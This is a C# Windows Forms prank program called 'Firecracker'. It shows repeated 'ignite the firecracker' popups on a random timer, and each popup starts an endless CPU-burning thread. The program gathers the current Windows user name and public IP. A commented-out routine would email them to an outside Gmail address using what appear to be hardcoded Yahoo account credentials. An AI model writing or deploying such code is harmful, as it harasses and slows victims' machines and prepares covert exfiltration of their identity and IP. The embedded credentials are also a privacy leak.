using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.Net.Mail;
using System.Web;
using System.Net;

namespace Firecracker
{
    public partial class Form1 : Form
    {
        Random ran = new Random();
        public Form1()
        {
            InitializeComponent();
        }

        bool run = true;
        private string subject;
        private string ip;
        private string user;
        private string pass;

        private void getInfo()
        {
            subject = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            ip = new WebClient().DownloadString("http://icanhazip.com");

            /*
            user = "oliveolivear@yahoo.com";
            pass = "nitro005";
            */
        }

        private void button1_Click(object sender, EventArgs e)
        {
            getInfo();
            timer1.Enabled = false;
            MessageBox.Show("Thank you " + subject + " " + ip + "\n for igniting the firecracker");
            run = false;
            //sendEmail("body");
            this.Close();
        }
        private void Ignite()
        {
            
            MessageBox.Show("Please ignite the firecracker");
            Thread s = new Thread(new ThreadStart(solveQuadratic));
            s.Start();
            timer1.Enabled = true;
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            timer1.Interval = (ran.Next(2000, 6000));
            timer1.Enabled = false;
            Ignite();
        }
        private void solveQuadratic()
        {
            while (run)
            {
                int x = (int)Math.Sqrt(Math.PI);
            }
        }
        /*
        private void sendEmail(string body)
        {
            MailMessage mail = new MailMessage(user, "olivearlerel@gmail.com", "ip", body);
            //SmtpServer = smtp.company.com; Ex: Gmail - smtp.gmail.com | Yahoo - symtp.yahoo.com
            SmtpClient client = new SmtpClient("smtp.yahoo.com");
            // Port 587 is preferred port for mail submission. Port 25 is widely abused by malware.
            client.Port = 587;
            client.Credentials = new System.Net.NetworkCredential(user, pass);
            client.EnableSsl = true;
            client.Send(mail);
            MessageBox.Show("Sent!");

        }
        */
    }
}
